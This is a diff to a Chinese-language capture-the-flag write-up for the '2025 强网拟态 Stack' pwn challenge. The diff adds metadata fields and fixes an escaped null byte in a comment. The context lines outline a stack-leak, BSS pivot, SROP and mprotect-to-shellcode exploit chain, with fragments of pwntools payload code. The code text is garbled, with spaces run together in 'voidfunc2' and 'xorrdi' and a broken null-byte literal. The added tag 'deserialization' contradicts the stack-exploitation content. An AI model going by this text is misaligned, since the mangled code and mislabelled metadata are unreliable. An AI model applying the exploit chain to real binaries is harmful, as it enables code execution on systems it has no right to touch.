@@ -74,6 +74,9 @@ prerequisites:
 - pwntools SigreturnFrame构造
 - mprotect+shellcode链
 - Linux syscall调用约定
+contest_normalized: "强网拟态"
+contest_year: 2025
+subcategory_guess: "deserialization"
 ---
 # 解析2025强网拟态Stack
 
@@ -249,7 +252,7 @@ voidfunc2(){ charbuf[0x60]; puts("Any thing else?"); read(0, buf,0x200); // 读�
 voidfunc3(){ puts("Goodbye!"); mov rax,0x3c; // sys_exit xorrdi, rdi; syscall; // 地址: 0x40140e}
 ROPgadget --binary pwn | grep -E"syscall|pop"
 第一步：泄露栈地址 ↓第二步：栈溢出 + 栈迁移到BSS段 ↓第三步：在BSS段上构造SROP frame ↓第四步：通过SROP调用mprotect修改BSS段权限为可执行 ↓第五步：执行shellcode读取flag
-# 发送0x10字节，没有' '截断payload =b'A'*0x10send(payload)
+# 发送0x10字节，没有'\\x00'截断payload =b'A'*0x10send(payload)
 # printf会继续打印后面的栈数据recv_until(b'A'*0x10)stack_addr = u64(recv(6).ljust(8,b'x00'))
 bss = elf.bss() # 0x404080bss = (bss >>12) <<12
 # 页对齐: 0x404000
